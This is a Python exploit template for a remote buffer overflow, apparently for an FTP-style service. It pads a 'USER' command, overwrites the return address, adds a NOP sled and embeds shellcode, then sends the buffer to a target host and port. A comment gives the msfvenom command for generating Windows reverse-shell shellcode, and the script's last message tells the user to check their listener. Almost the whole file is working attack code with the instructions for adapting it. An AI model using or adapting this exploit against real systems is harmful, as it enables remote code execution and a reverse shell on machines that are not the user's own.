#!/usr/bin/python

#SKELETON SCRIPT FOR FUZZING SOFTWARES REMOTELY, USEFUL FOR OVERFLOWS OVER THE NETWORK
#ALWAYS MODIFY SHELLCODE!!!!!


import socket
import sys
import time


if len(sys.argv) < 3:
	print("Usage: python 06-exploit.py $TargetIP $Port")
	sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = 'USER ' #Modify This as per software
junk = '\x41' * 230  #Modify This as per software
eip = '\x53\x93\x42\x7e' #Modify This as Target OS
nops = '\x90' * 20

#Customise this using msfvenom
#Common Syntax: msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -b "badcharlist" -f c > outfile
shellcode = ("\xbe\x40\x29\xd4\xb8\xd9\xc0\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x83\xc5\x04\x31\x75\x0e\x03\x35\x27\x36\x4d\x49\xdf\x34"
"\xae\xb1\x20\x59\x26\x54\x11\x59\x5c\x1d\x02\x69\x16\x73\xaf"
"\x02\x7a\x67\x24\x66\x53\x88\x8d\xcd\x85\xa7\x0e\x7d\xf5\xa6"
"\x8c\x7c\x2a\x08\xac\x4e\x3f\x49\xe9\xb3\xb2\x1b\xa2\xb8\x61"
"\x8b\xc7\xf5\xb9\x20\x9b\x18\xba\xd5\x6c\x1a\xeb\x48\xe6\x45"
"\x2b\x6b\x2b\xfe\x62\x73\x28\x3b\x3c\x08\x9a\xb7\xbf\xd8\xd2"
"\x38\x13\x25\xdb\xca\x6d\x62\xdc\x34\x18\x9a\x1e\xc8\x1b\x59"
"\x5c\x16\xa9\x79\xc6\xdd\x09\xa5\xf6\x32\xcf\x2e\xf4\xff\x9b"
"\x68\x19\x01\x4f\x03\x25\x8a\x6e\xc3\xaf\xc8\x54\xc7\xf4\x8b"
"\xf5\x5e\x51\x7d\x09\x80\x3a\x22\xaf\xcb\xd7\x37\xc2\x96\xbf"
"\xf4\xef\x28\x40\x93\x78\x5b\x72\x3c\xd3\xf3\x3e\xb5\xfd\x04"
"\x40\xec\xba\x9a\xbf\x0f\xbb\xb3\x7b\x5b\xeb\xab\xaa\xe4\x60"
"\x2b\x52\x31\x26\x7b\xfc\xea\x87\x2b\xbc\x5a\x60\x21\x33\x84"
"\x90\x4a\x99\xad\x3b\xb1\x4a\x12\x13\xb9\xbe\xfa\x66\xb9\xaf"
"\xa6\xef\x5f\xa5\x46\xa6\xc8\x52\xfe\xe3\x82\xc3\xff\x39\xef"
"\xc4\x74\xce\x10\x8a\x7c\xbb\x02\x7b\x8d\xf6\x78\x2a\x92\x2c"
"\x14\xb0\x01\xab\xe4\xbf\x39\x64\xb3\xe8\x8c\x7d\x51\x05\xb6"
"\xd7\x47\xd4\x2e\x1f\xc3\x03\x93\x9e\xca\xc6\xaf\x84\xdc\x1e"
"\x2f\x81\x88\xce\x66\x5f\x66\xa9\xd0\x11\xd0\x63\x8e\xfb\xb4"
"\xf2\xfc\x3b\xc2\xfa\x28\xca\x2a\x4a\x85\x8b\x55\x63\x41\x1c"
"\x2e\x99\xf1\xe3\xe5\x19\x01\xae\xa7\x08\x8a\x77\x32\x09\xd7"
"\x87\xe9\x4e\xee\x0b\x1b\x2f\x15\x13\x6e\x2a\x51\x93\x83\x46"
"\xca\x76\xa3\xf5\xeb\x52")
end = '\r\n' #Modify This as per software

buffer = cmd + junk + eip + nops + shellcode + end

print("Please wait while we pass the buffer...")
time.sleep(3)
print("Passing Buffer in 3 seconds...")
time.sleep(3)
s.connect((host,port))
s.recv(1024)
s.send(buffer)
s.recv(1024)
s.close()
print("Done! Check your listener :)")
time.sleep(1)
print("Exiting...")
time.sleep(1)
